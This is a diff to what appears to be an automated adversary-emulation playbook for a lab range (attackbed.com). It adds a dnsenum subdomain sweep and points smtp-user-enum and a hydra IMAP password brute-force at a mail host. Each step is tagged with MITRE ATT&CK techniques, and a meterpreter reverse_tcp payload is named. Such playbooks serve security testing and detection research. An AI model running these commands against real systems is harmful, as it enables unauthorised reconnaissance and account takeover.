@@ -5,13 +5,24 @@
 ####################
 vars:
   $SERVER_ADDRESS: 192.42.0.254
+  $MAIL_HOST: mail.attackbed.com
   $ATTACKER_ADDRESS: 192.42.1.174
   DOMAIN: attackbed.com
   PAYLOAD_DOCKER: cmd/linux/http/x64/meterpreter/reverse_tcp
+  DNS_LIST: /usr/local/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 
 commands:
   - type: shell
-    cmd: ./smtp-user-enum.pl  -M VRFY -U smtp-user.txt -t $SERVER_ADDRESS
+    cmd: dnsenum -f $DNS_LIST --dnsserver 192.42.0.233 $DOMAIN
+    metadata:
+      techniques: "T1590.002,T1591"
+      tactics: "Reconnaissance"
+      technique_name: "Gather Victim Network Information: DNS,Gather Victim Org Information"
+      description: "Enumerate subdomains of corporate domain-zone"
+
+
+  - type: shell
+    cmd: ./smtp-user-enum.pl  -M VRFY -U smtp-user.txt -t $MAIL_HOST
     metadata:
       techniques: "T1589.002"
       tactics: "Reconnaissance"
@@ -24,7 +35,7 @@ commands:
     random: true
 
   - type: shell
-    cmd: hydra -l "alice@$DOMAIN" -P smtp-pass.txt -c 5 -s 143 $SERVER_ADDRESS imap  
+    cmd: hydra -l "alice@$DOMAIN" -P smtp-pass.txt -c 5 -s 143 $MAIL_HOST imap  
     metadata:
       techniques: "T1078.002,T1110.001,T1133"
       tactics: "Initial Access"
